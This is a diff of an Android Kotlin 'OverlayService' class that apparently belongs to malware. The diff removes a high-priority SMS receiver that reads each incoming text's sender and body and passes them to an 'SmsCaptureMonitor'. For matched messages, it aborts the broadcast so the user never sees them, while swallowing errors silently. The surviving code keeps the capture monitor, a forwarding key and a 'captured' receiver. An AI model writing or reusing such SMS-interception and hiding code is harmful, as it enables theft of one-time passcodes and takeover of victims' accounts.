@@ -30,7 +30,6 @@ class OverlayService : Service() {
     private var lastForwardedKey: String? = null
     private var running = false
     private var smsMonitor: SmsCaptureMonitor? = null
-    private var smsReceiver: BroadcastReceiver? = null
     private var capturedReceiver: BroadcastReceiver? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -106,32 +105,6 @@ class OverlayService : Service() {
     }
 
     private fun registerReceivers() {
-        if (smsReceiver == null) {
-            smsReceiver = object : BroadcastReceiver() {
-                override fun onReceive(context: Context?, intent: Intent?) {
-                    if (intent == null) return
-                    val parts = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
-                    val sender = parts.firstOrNull()?.originatingAddress?.trim().orEmpty()
-                    val body = parts.joinToString("") { it.messageBody.orEmpty() }.trim()
-                    if (smsMonitor?.processIncoming(sender, body) == true) {
-                        try {
-                            abortBroadcast()
-                        } catch (_: Exception) {}
-                    }
-                }
-            }
-            try {
-                val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION).apply {
-                    priority = 999
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    registerReceiver(smsReceiver, filter, RECEIVER_EXPORTED)
-                } else {
-                    registerReceiver(smsReceiver, filter)
-                }
-            } catch (_: Exception) {}
-        }
-
         if (capturedReceiver == null) {
             capturedReceiver = object : BroadcastReceiver() {
                 override fun onReceive(context: Context?, intent: Intent?) {
@@ -150,9 +123,7 @@ class OverlayService : Service() {
     }
 
     private fun unregisterReceivers() {
-        smsReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
         capturedReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
-        smsReceiver = null
         capturedReceiver = null
     }
 
